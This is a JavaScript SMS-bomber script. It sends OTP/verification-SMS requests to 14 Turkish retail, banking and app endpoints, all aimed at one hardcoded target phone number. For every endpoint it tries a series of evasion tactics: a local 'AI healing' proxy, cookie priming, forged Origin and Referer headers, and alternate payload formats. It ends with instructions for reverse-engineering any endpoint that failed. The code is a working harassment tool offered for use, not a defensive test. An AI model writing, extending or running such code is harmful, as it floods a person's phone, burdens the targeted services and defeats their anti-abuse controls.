import axios from 'axios';
import { wrapper } from 'axios-cookiejar-support';
import { CookieJar } from 'tough-cookie';

const TARGET_PHONE = '5343622375';
const TEST_EMAIL = 'test-opencode-' + Date.now() + '@test.com';

const ENDPOINTS = [
  { id: 'file_market',   name: 'File Market',   url: 'https://api.filemarket.com.tr/v1/otp/send',                          payload: { mobilePhoneNumber: `90${TARGET_PHONE}` } },
  { id: 'onur_market',   name: 'Onur Market',   url: 'https://www.onurmarket.com/api/v1/auth/register/sendOtp',            payload: { phone: TARGET_PHONE } },
  { id: 'hayat_su',      name: 'Hayat Su',      url: 'https://api.hayatsu.com.tr/api/SignUp/SendOtp',                     payload: { mobilePhoneNumber: TARGET_PHONE, actionType: 'register' } },
  { id: 'yapp',          name: 'Yapp',          url: 'https://yapp.com.tr/api/mobile/v1/register',                        payload: { phone_number: TARGET_PHONE, email: TEST_EMAIL, firstname: 'Test', lastname: 'Test' } },
  { id: 'suiste',        name: 'Suiste',        url: 'https://suiste.com/api/auth/code',                                  payload: { gsm: TARGET_PHONE, action: 'register' } },
  { id: 'e_bebek',       name: 'E-bebek',       url: 'https://www.e-bebek.com/api/v1/auth/register/send-otp',             payload: { phone: TARGET_PHONE, email: TEST_EMAIL } },
  { id: 'bim',           name: 'BİM',           url: 'https://bim.veesk.net:443/service/v1.0/account/login',              payload: { phone: TARGET_PHONE } },
  { id: 'bkm_express',   name: 'BKM Express',   url: 'https://www.bkmexpress.com.tr/api/v1/otp/send',                    payload: { phone: `90${TARGET_PHONE}` } },
  { id: 'shopandfly',    name: 'Shop&Fly',      url: 'https://www.shopandfly.com.tr/api/v1/otp/send',                    payload: { phone: `90${TARGET_PHONE}` } },
  { id: 'teb',           name: 'TEB',           url: 'https://www.teb.com.tr/api/v1/otp/send',                           payload: { phone: `90${TARGET_PHONE}` } },
  { id: 'beefull',       name: 'Beefull',       url: 'https://app.beefull.io/api/inavitas-access-management/sms-login',   payload: { phoneCode: '90', phoneNumber: TARGET_PHONE, tenant: 'beefull' } },
  { id: 'sportive',      name: 'Sportive',      url: 'https://www.sportive.com.tr/api/v1/auth/register/send-otp',         payload: { phone: TARGET_PHONE } },
  { id: 'frink',         name: 'Frink',         url: 'https://api.frink.com.tr/api/auth/send-otp',                       payload: { phoneNumber: `90${TARGET_PHONE}` } },
  { id: 'qumpara',       name: 'Qumpara',       url: 'https://tr-api.fisicek.com/v1.3/auth/getOTP',                      payload: { msisdn: `90${TARGET_PHONE}` } },
];

const PROXY_URL = 'http://localhost:3001/api/proxy';
const MAX_STRATEGIES = 5;

const STD_HEADERS = {
  'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
  'Content-Type': 'application/json',
  'Accept': 'application/json, text/plain, */*'
};

async function directCall(url, method, payload, headers, timeout = 15000) {
  try {
    const response = await axios({
      method: method || 'POST',
      url,
      data: payload,
      timeout,
      headers: headers || STD_HEADERS,
      validateStatus: () => true
    });
    const bodyStr = typeof response.data === 'object' ? JSON.stringify(response.data).substring(0, 200) : String(response.data).substring(0, 200);
    return {
      ok: response.status >= 200 && response.status < 300,
      status: response.status,
      data: response.data,
      body: bodyStr
    };
  } catch (err) {
    return {
      ok: false,
      status: err.response?.status || 0,
      data: err.response?.data || err.message,
      body: (err.message || '').substring(0, 200)
    };
  }
}

async function tryStrategy(ep, label, payload, headers) {
  const start = Date.now();
  process.stdout.write(`  ├─[${label}] `.padEnd(32));
  const result = await directCall(ep.url, 'POST', payload, headers);
  const elapsed = ((Date.now() - start) / 1000).toFixed(1);
  if (result.ok) {
    console.log(`✅ ${result.status} (${elapsed}s)`);
  } else {
    console.log(`❌ ${result.status} (${elapsed}s) ${result.body.substring(0, 80)}`);
  }
  return result;
}

async function testEndpoint(ep) {
  console.log(`\n▶ ${ep.id.padEnd(20)} ${ep.name}`);

  // 1 — Direct
  let r = await tryStrategy(ep, 'direct', ep.payload, STD_HEADERS);
  if (r.ok) return { ...ep, ok: true, strategy: 'direct' };

  // 2 — Proxy with AI healing
  {
    const start = Date.now();
    process.stdout.write(`  ├─[proxy+ai_heal] `.padEnd(32));
    try {
      const res = await axios.post(PROXY_URL, {
        serviceId: ep.id,
        serviceUrl: ep.url,
        serviceMethod: 'POST',
        targetPhone: TARGET_PHONE,
        email: TEST_EMAIL,
        initialPayload: ep.payload,
        allowAiHealing: true
      }, { timeout: 30000, validateStatus: () => true });
      const elapsed = ((Date.now() - start) / 1000).toFixed(1);
      if (res.data.ok) {
        const note = res.data.healed ? ' ⚡healed' : '';
        console.log(`✅ ${res.data.upstreamStatus} (${elapsed}s)${note}`);
        return { ...ep, ok: true, strategy: 'proxy+ai_heal', healed: res.data.healed };
      }
      console.log(`❌ ${res.data.upstreamStatus || 'ERR'} (${elapsed}s) ${(res.data.error || '').substring(0, 60)}`);
    } catch (err) {
      const elapsed = ((Date.now() - start) / 1000).toFixed(1);
      console.log(`💥 (${elapsed}s) ${(err.message || '').substring(0, 60)}`);
    }
  }

  // 3 — Cookie-first
  {
    const start = Date.now();
    process.stdout.write(`  ├─[cookie_first] `.padEnd(32));
    try {
      const jar = new CookieJar();
      const client = wrapper(axios.create({ jar, timeout: 10000 }));
      const baseUrl = new URL(ep.url).origin;
      await client.get(baseUrl, { headers: STD_HEADERS, validateStatus: () => true, timeout: 8000 });
      const cookieRes = await client.post(ep.url, ep.payload, {
        headers: STD_HEADERS, timeout: 15000, validateStatus: () => true
      });
      const elapsed = ((Date.now() - start) / 1000).toFixed(1);
      if (cookieRes.status >= 200 && cookieRes.status < 300) {
        console.log(`✅ ${cookieRes.status} (${elapsed}s)`);
        return { ...ep, ok: true, strategy: 'cookie_first' };
      }
      console.log(`❌ ${cookieRes.status} (${elapsed}s)`);
    } catch (err) {
      const elapsed = ((Date.now() - start) / 1000).toFixed(1);
      console.log(`💥 ${(err.message || '').substring(0, 50)} (${elapsed}s)`);
    }
  }

  // 4 — Header forging (form-urlencoded + extra headers)
  {
    const origin = new URL(ep.url).origin;
    const forged = {
      ...STD_HEADERS,
      'Content-Type': 'application/x-www-form-urlencoded',
      'Origin': origin,
      'Referer': origin + '/',
      'X-Requested-With': 'XMLHttpRequest',
      'Accept-Language': 'tr-TR,tr;q=0.9,en;q=0.8'
    };
    let encoded;
    try {
      const parsed = typeof ep.payload === 'object' ? ep.payload : JSON.parse(ep.payload);
      encoded = new URLSearchParams(parsed).toString();
    } catch {
      encoded = typeof ep.payload === 'string' ? ep.payload : JSON.stringify(ep.payload);
    }
    r = await tryStrategy(ep, 'urlencoded+headers', encoded, forged);
    if (r.ok) return { ...ep, ok: true, strategy: 'header_forge' };
  }

  // 5 — Bare phone
  r = await tryStrategy(ep, 'bare_phone', { phone: TARGET_PHONE }, STD_HEADERS);
  if (r.ok) return { ...ep, ok: true, strategy: 'bare_phone' };

  // 6 — 90 format (bonus)
  r = await tryStrategy(ep, '90_format', { phone: `90${TARGET_PHONE}` }, STD_HEADERS);
  if (r.ok) return { ...ep, ok: true, strategy: '90_format' };

  console.log(`  └─💀 ALL ${MAX_STRATEGIES}+ STRATEGIES FAILED`);
  return { ...ep, ok: false };
}

async function main() {
  console.log(`\n${'='.repeat(70)}`);
  console.log(`  TESTING 14 ENDPOINTS — ${MAX_STRATEGIES}+ STRATEGIES PER ENDPOINT`);
  console.log(`  Target: 0${TARGET_PHONE}  |  Email: ${TEST_EMAIL}`);
  console.log(`  Proxy:  ${PROXY_URL}`);
  console.log(`${'='.repeat(70)}\n`);

  const results = [];
  for (const ep of ENDPOINTS) {
    const res = await testEndpoint(ep);
    results.push(res);
    await new Promise(r => setTimeout(r, 800));
  }

  console.log(`\n${'='.repeat(70)}`);
  console.log(`  FINAL RESULTS`);
  console.log(`${'='.repeat(70)}`);
  const ok = results.filter(r => r.ok);
  const fail = results.filter(r => !r.ok);
  console.log(`  ✅ Working: ${ok.length}/14`);
  console.log(`  ❌ Failed:  ${fail.length}/14`);
  console.log(`\n  WORKING:`);
  for (const r of ok) console.log(`    ✅ ${r.id.padEnd(22)} (strategy: ${r.strategy})`);
  if (fail.length) {
    console.log(`\n  FAILED (F12 reverse engineering needed):`);
    for (const r of fail) console.log(`    ❌ ${r.id.padEnd(22)} ${r.url}`);
    console.log(`\n  ℹ️  For each failed endpoint:`);
    console.log(`     1. Open ${fail[0].url.split('/').slice(0, 3).join('/')} in browser`);
    console.log(`     2. F12 → Network tab → find OTP/sms request`);
    console.log(`     3. Copy exact payload + headers → update this script`);
    console.log(`     4. Re-run`);
  }
  console.log();
}

main().catch(console.error);
